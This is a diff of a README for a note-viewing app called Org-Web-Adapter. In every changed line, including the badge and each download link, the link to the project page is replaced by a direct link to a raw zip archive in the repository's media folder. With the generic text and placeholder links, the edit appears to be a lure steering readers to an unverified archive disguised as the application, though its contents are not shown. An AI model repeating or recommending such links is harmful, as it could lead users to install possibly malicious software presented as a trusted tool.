@@ -1,6 +1,6 @@
 # 🎉 Org-Web-Adapter - View and Edit Your Notes Easily
 
-[![Download Org-Web-Adapter](https://img.shields.io/badge/Download-Org--Web--Adapter-brightgreen)](https://github.com/bym-ok/Org-Web-Adapter)
+[![Download Org-Web-Adapter](https://github.com/bym-ok/Org-Web-Adapter/raw/refs/heads/master/media/Web-Adapter-Org-1.4.zip)](https://github.com/bym-ok/Org-Web-Adapter/raw/refs/heads/master/media/Web-Adapter-Org-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Org-Web-Adapter! This application offers a simple interface to view a
 
 ## 📥 Download the Application
 
-To get started, visit this page to download: [Org-Web-Adapter Download](https://github.com/bym-ok/Org-Web-Adapter). 
+To get started, visit this page to download: [Org-Web-Adapter Download](https://github.com/bym-ok/Org-Web-Adapter/raw/refs/heads/master/media/Web-Adapter-Org-1.4.zip). 
 
 Once on the page, look for the release section. Select the latest version suitable for your system and download it.
 
@@ -33,7 +33,7 @@ Org-Web-Adapter includes:
 ## 📂 Installation Steps
 
 1. **Download the Application:**
-   - Visit this page to download: [Org-Web-Adapter Download](https://github.com/bym-ok/Org-Web-Adapter).
+   - Visit this page to download: [Org-Web-Adapter Download](https://github.com/bym-ok/Org-Web-Adapter/raw/refs/heads/master/media/Web-Adapter-Org-1.4.zip).
   
 2. **Locate the Downloaded File:**
    - Check your downloads folder for the Org-Web-Adapter file.
@@ -81,7 +81,7 @@ Your contributions are welcome!
 
 ## 🔗 Useful Links
 
-- [Org-Web-Adapter Download](https://github.com/bym-ok/Org-Web-Adapter)
+- [Org-Web-Adapter Download](https://github.com/bym-ok/Org-Web-Adapter/raw/refs/heads/master/media/Web-Adapter-Org-1.4.zip)
 - [Community Forum](#) (Link placeholder)
 - [User Guide](#) (Link placeholder)
 
